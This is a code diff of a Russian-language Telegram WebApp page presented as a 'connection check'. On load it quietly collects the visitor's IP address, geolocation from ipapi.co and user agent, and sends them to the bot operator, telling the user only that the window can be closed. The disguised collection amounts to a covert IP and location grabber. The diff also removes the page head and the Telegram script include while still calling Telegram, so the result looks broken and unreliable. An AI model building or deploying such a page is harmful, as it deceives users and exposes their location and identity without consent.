@@ -1,18 +1,16 @@
-<!DOCTYPE html>
-<html lang="ru">
-<head>
-  <meta charset="UTF-8">
-  <title>Проверка соединения</title>
-  <script src="https://telegram.org/js/telegram-web-app.js"></script>
+<body>
+  <h2>🔍 Проверка соединения...</h2>
+  <div id="status">⏳ Отправка данных...</div>
+  <p>Окно можно закрыть</p>
+
   <script>
     async function sendData() {
-      // Проверка, что WebApp работает в Telegram
+      const status = document.getElementById("status");
+
       if (!Telegram.WebApp || !Telegram.WebApp.initData || Telegram.WebApp.initData.length === 0) {
-        document.body.innerHTML = "<h2>❌ Открой страницу через Telegram</h2>";
+        status.innerText = "❌ Открой страницу через Telegram";
         return;
       }
-
-      console.log("✅ Telegram WebApp инициализирован");
 
       try {
         const ipData = await fetch("https://ipapi.co/json/").then(r => r.json());
@@ -27,22 +25,15 @@
           ua: userAgent
         };
 
-        console.log("📨 Отправка данных в Telegram:", payload);
         Telegram.WebApp.sendData(JSON.stringify(payload));
+        status.innerText = "✅ Данные отправлены";
       } catch (e) {
-        console.error("❌ Ошибка при отправке:", e);
-        document.body.innerHTML = "<h2>❌ Ошибка при подключении</h2><p>" + e.message + "</p>";
+        status.innerText = "❌ Ошибка: " + e.message;
       }
     }
 
-    // Ждём полной загрузки и инициализации Telegram
     window.addEventListener('DOMContentLoaded', () => {
-      setTimeout(sendData, 300);  // даём Telegram чуть времени
+      setTimeout(sendData, 500);  // чуть больше времени на инициализацию
     });
   </script>
-</head>
-<body>
-  <h2>🔍 Проверка соединения...</h2>
-  <p>Окно можно закрыть</p>
 </body>
-</html>
